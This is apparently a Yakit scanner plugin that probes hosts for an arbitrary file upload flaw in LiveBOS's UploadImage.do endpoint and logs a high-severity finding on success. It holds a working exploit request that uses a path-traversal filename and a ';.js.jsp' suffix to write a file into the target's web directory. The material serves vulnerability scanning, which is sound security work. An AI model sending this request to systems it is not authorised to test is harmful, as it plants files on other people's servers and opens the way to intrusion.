# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /feed/UploadImage.do;.js.jsp HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/4.0(compatible; MSIE 9.0; Windows NT 6.1)
Content-Length: 274
Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryxegqoxxi
Accept-Encoding: gzip
---WebKitFormBoundaryxegqoxxi
Content-Disposition:
form-data;
name="file";
filename="../../../../../../././../../../../../java/fh/tomcat_fhxszsq/LiveBos/FormBuilder/
feed/jsp/vtnifpvi.js"
Content-Type: image/jpeg
GIF89a 123123123
---WebKitFormBoundaryxegqoxxi--
`


    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )


    if str.MatchAllOfSubString(rsp, 'HTTP/1.1 200','imgName'){
        yakit.Info("%v found LiveBOSUploadImage.do接口任意文件上传", addr)
        risk.NewRisk(
        addr,
        risk.title("LiveBOSUploadImage.do接口任意文件上传"),
        risk.severity("high"),
        risk.titleVerbose("LiveBOSUploadImage.do接口任意文件上传"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
